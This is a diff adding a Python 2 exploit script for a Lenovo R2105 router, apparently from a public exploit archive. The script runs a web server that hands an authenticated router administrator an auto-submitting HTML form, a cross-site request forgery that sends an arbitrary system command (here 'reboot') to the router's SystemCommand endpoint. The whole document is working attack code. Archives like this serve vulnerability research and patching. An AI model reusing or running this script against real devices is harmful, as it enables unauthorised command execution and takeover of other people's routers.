@@ -1,0 +1,47 @@
+# Exploit Title: Lenovo R2105 Remote Code Execution through CSRF
+# Date: 01/14/2019
+# Exploit Author: Nathu Nandwani
+# Website: http://nandtech.co/
+# Version: 1.0
+# Tested on: Windows 10 x64
+# Note: The administrator who opens the URL should be authenticated.
+
+import socket
+ 
+server_ip = "0.0.0.0"
+server_port = 80 
+router_ip = "192.168.11.1"
+
+command = "reboot"
+ 
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind((server_ip, server_port))
+sock.listen(1)
+ 
+print "Currently listening at " + server_ip + ":" + str(server_port)        
+ 
+client, (client_host, client_port) = sock.accept()
+ 
+print "Client connected: " + client_host + ":" + str(client_port)
+print ""
+print client.recv(1000)
+ 
+client.send('HTTP/1.0 200 OK\r\n')
+client.send('Content-Type: text/html\r\n')
+client.send('\r\n')
+client.send("""
+<html>
+    <body>
+        <form method="post" id="frmcmd" name="frmSetup" action="http://""" + router_ip + """/goform/SystemCommand">
+            <input name="command" value=""" + command + """ type="hidden">
+            <input name="SystemCommandSubmit" value="Apply" type="hidden">
+        </form>
+        <script>
+            document.getElementById("frmcmd").submit();
+        </script>
+    </body>
+</html>
+""")
+ 
+client.close()
+sock.close()
